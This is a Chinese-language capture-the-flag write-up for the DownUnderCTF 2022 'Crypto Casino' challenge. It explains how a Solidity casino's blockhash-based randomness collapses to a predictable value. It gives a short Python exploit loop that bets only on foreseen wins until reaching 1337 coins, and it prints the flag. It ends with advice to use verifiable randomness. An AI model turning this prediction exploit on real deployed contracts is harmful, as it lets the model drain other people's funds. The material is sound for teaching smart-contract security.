# DownUnderCTF 2022 Crypto Casino Writeup

## 题目简述

题目包含 ERC-20 代币 `DUCoin` 和赌场合约 `Casino`。玩家只能领取 7 枚试玩币，而平台要求最终持有至少 1337 DUCoin。赌场把玩家存款记在 `balances` 中，每次下注若点数为 0 就增加一份下注额，否则扣除下注额。

所谓随机数完全来自区块哈希：

```solidity
function _randomNumber() internal view returns (uint8) {
    uint256 ab = uint256(blockhash(block.number - 1));
    uint256 a = ab & 0xffffffff;
    uint256 b = (ab >> 32) & 0xffffffff;
    uint256 x = uint256(blockhash(block.number));
    return uint8((a * x + b) % 6);
}
```

## 解题过程

EVM 对当前区块执行 `blockhash(block.number)` 时返回 0，因此实际点数退化为上一块哈希中 `b % 6`。在发送下注交易前读取当前最新区块哈希；这笔交易进入下一块后，该哈希正好成为合约看到的 `block.number - 1`。由此可以提前判断下一次调用是否必胜。

先领取 7 枚试玩币，授权赌场并全部存入。之后逐块检查哈希：预测会输时调用 `play(0)`，既推进区块又不损失余额；预测点数为 0 时押上全部赌场余额，使余额翻倍。

```python
def predicted_win():
    h = int.from_bytes(web3.eth.get_block(web3.eth.block_number).hash, "big")
    b = (h >> 32) & 0xffffffff
    return b % 6 == 0

while casino.functions.balances(player).call() < 1337:
    balance = casino.functions.balances(player).call()
    bet = balance if predicted_win() else 0
    send(casino.functions.play(bet))
```

余额按 $7,14,28,\ldots$ 翻倍，超过 1337 后调用 `withdraw(1337)`，即可满足平台检查并得到：

```text
DUCTF{sh0uldv3_us3d_a_vrf??}
```

## 方法总结

本题利用的是链上伪随机数可预测性。看到合约直接使用区块号、时间戳或区块哈希决定输赢时，应先核对这些值在当前交易中的 EVM 语义；即使表达式看起来复杂，只要输入可在交易前获知或会固定为零，攻击者就能只在有利结果上下注。生产合约应使用可验证随机函数或提交—揭示协议，而不能把公开区块数据当作秘密随机源。
